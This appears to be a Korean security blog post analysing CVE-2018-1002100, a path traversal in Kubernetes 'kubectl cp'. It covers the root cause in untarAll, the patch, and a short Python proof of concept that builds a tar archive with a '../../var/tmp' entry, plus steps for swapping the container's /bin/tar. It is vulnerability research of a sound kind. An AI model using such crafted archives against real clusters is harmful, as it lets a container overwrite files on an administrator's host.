---
layout: post
title: "CVE-2018-1002100"
date: 2021-12-28
categories: Kubernetes
tags: [kubernetes, cve]
---

# 개요

|     취약한 버전     |           취약점 종류           |                                 취약점 설명                                  |
| :-----------------: | :-----------------------------: | :--------------------------------------------------------------------------: |
| kubernetes: ~v1.9.5 | overwrite arbitrary local files | “kubectl cp” 명령어를 통해, 컨테이너에서 노드의 파일을 덮어쓸 수 있는 취약점 |

---

# 배경지식

아래는 pkg/kubectl/cmd/cp.go 파일을 볼 때, 알아야 하는 함수들이다.  
path.join 함수는 입력된 경로들을 순차적으로 탐색했을 때, 나올 수 있는 하나의 경로를 반환하는 함수이다.

```
package main
import (
	"fmt"
	"path"
)

func main() {
	fmt.Println(path.Join("a", "/b", "/c"))
	fmt.Println(path.Join("a", "/b/c"))
	fmt.Println(path.Join("a/b", "/c"))

	fmt.Println(path.Join("a/b", "../../../xyz"))

	fmt.Println(path.Join("", ""))
	fmt.Println(path.Join("a", ""))
	fmt.Println(path.Join("", "a"))
}
```

위 코드의 실행 결과는 다음과 같다.

![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC4.png?raw=true)

path.clean 함수는 입력된 경로와 동등한 가장 짧은 경로를 반환하는 함수이다.

```
package main
import (
	"fmt"
	"path"
)

func main() {
	paths := []string{
		"a/c",
		"a//c",
		"a/c/.",
		"a/c/b/..",
		"/../a/c",
		"/../a/b/../././/c",
		"",
	}
	for _, p := range paths {
		fmt.Printf("Clean(%q) = %q\n", p, path.Clean(p))
	}
}
```

위 코드의 실행 결과는 다음과 같다.

![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC3.png?raw=true)

---

# Root Cause 분석

“kubectl cp” 명령어를 수행하면, tar 아카이브 파일을 컨테이너와 호스트가 주고 받는데, 이때 호스트는 kubectl 내에 구성된 cp.go 파일에서 tar 파일을 처리하는 루틴을 구현해 놓았고, 컨테이너에서는 /bin/tar 바이너리를 사용해서 tar 아카이빙을 수행한다.

이때, 호스트에서 전송받은 tar 아카이브 파일이 “../../../../../tmp/foo”와 같이, 상위 디렉토리로 거슬러 올라가도록 만들어 놓으면, 파일을 해제할 때, 이를 그대로 올라가 파일을 덮어쓴다. 즉, path traversal이 일어나는 것이고, /bin/tar 바이너리를 공격자가 임의로 수정하면, “kubectl cp” 명령이 해당 컨테이너를 대상으로 수행될 때, 항상 원하는 결과를 반환할 수 있다. 따라서, 위에서 재연할 때는, 미리 구현한 특정 tar 아카이브를 읽도록 /bin/tar 실행 파일을 수정하였다.

```
func untarAll(reader io.Reader, destFile, prefix string) error {
	entrySeq := -1

	// TODO: use compression here?
	tarReader := tar.NewReader(reader)
	for {
		header, err := tarReader.Next()
		if err != nil {
			if err != io.EOF {
				return err
			}
			break
		}
		entrySeq++
		mode := header.FileInfo().Mode()
		outFileName := path.Join(destFile, header.Name[len(prefix):])
		...
}
```

header.Name[len(prefix):]은 header.Name에서 prefix를 제외하고난 파일명이다.

위에서도 봤듯이 path.Join은 단순히 인자로 들어간 경로들을 차례로 접근했을 때, 하나의 단순화된 경로를 반환하는 함수이다. 즉, path traversal로 루트 디렉토리로 파고들어가는 것이 가능하다.

`kubectl cp mongodb:/something ./123`

- prefix: something
- destFile: ./123
- header.Name: 아카이브에 있는 파일/디렉토리 명
- outFileName: destFile과 header.Name에서 prefix를 제외하여 path.Join한 결과

→ 원래라면, prefix를 빼고, destFile을 상위 디렉토리로 하여 파일을 복사해오는 것이지만, path traversal이 일어나기 때문에, 상위 디렉토리로 올라가게 된다.

---

# Exploit 재연

```
#!/usr/bin/python3

import tarfile
import tempfile
import os
import base64

with tarfile.TarFile.open("sample.tar", "w") as tar:
  with tempfile.NamedTemporaryFile() as text:
    text.write(b"Hello World\n")
    text.flush()

    tar.add(text.name,
      arcname="../../../../../../../var/tmp/unexpected")

  tar.close()
```

위 파일은 sample.tar를 만드는 코드로, 위를 수행하면, sample.tar 아카이브가 만들어지는데, 이를 확인해보면 다음과 같다. 파일명을 자세히 보면, 상위 디렉토리로 계속 거슬러 올라가서 /var/tmp/unexpected 파일을 압축한 것임을 알 수 있다.

![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC5.png?raw=true)

그리고, 컨테이너 내에서의 tar 파일을 지우고, 이를 쉘 스크립트 파일로 “cat sample.tar”을 하도록 만든다면, 쿠버네티스의 관리자가 공격자의 컨테이너를 대상으로 “kubectl cp” 명령어를 쳤을 때, 다음과 같이 공격에 성공할 수 있다.

![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC6.png?raw=true)

---

# 패치 내용

```
// clean prevents path traversals by stripping them out.
// This is adapted from https://golang.org/src/net/http/fs.go#L74
func clean(fileName string) string {
	return path.Clean(string(os.PathSeparator) + fileName)
}

unc untarAll(reader io.Reader, destFile, prefix string) error {
	entrySeq := -1

	// TODO: use compression here?
	tarReader := tar.NewReader(reader)
	for {
		header, err := tarReader.Next()
		if err != nil {
			if err != io.EOF {
				return err
			}
			break
		}
		entrySeq++
		mode := header.FileInfo().Mode()
		outFileName := path.Join(destFile, clean(header.Name[len(prefix):]))
		baseName := path.Dir(outFileName)
		...
}
```

outFileName, 즉, 파일을 호스트에 덮어 쓸 때, path.Clean을 수행하였고, untarAll에서 해당 함수 한 번 호출하도록 업데이트한 이후, 1.9.6에서 1.13.4까지 이 패치가 지속되었다. 아래는 path.clean 함수의 수행 결과를 보여주는데, 이러한 조치가 path traversal을 막는 적절한 조치였다는 것을 확인할 수 있다.

```
package main

import (
        "fmt"
        "os"
        "path"
)

func clean(fileName string) string {
        return path.Clean(string(os.PathSeparator) + fileName)
}

func main() {
        fmt.Println(clean("../../../../../../../var/tmp/unexpected"))
```



![](https://github.com/GroomPang/Research/blob/main/%EA%B7%B8%EB%A6%BC7.png?raw=true)

---

# 참고자료

National Vulnerability Database, “CVE-2018-1002100 Detail”, [link](https://nvd.nist.gov/vuln/detail/CVE-2018-1002100)

Michael Hanselmann, “OpenShift Source-to-Image build privilege escalation to root”, [link](https://hansmi.ch/articles/2018-04-openshift-s2i-security)